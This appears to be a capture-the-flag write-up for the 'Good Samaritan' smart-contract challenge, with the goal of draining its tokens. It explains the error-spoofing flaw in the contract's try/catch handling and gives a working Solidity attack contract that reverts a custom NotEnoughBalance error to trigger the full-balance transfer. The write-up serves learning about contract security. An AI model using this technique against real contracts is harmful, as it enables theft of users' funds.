#GOOD SAMARITAN
##Objective :to drain the contract out of tokens .

##analysis: 

wallet:
both of the functions donate10() and transferRemainder() are onlyOwner

coin
The Coin contract adds a million coins to the balance of the GoodSamaritan contract inside the constructor.
if(dest_.isContract()) checks if the address that requested the donation is a contract and calling the notify() function on the address

solution :
create a notify() function in our contract and make it revert a custom error with the name NotEnoughBalance(). this triggers error in the GoodSamaritan.requestDonation() ,  and catch block will be triggered transferring all the tokens.

add another condition to our notify() function to check if the amount <= 10, and then only revert. 

##exploit: 
```// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface GoodSamaritan {
    function requestDonation() external returns (bool);
}
contract BadSamaritan {
    error NotEnoughBalance();
    GoodSamaritan public goodSamaritan = GoodSamaritan(<addr>); 
    function attack() external {
        goodSamaritan.requestDonation();
    }
    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}

```

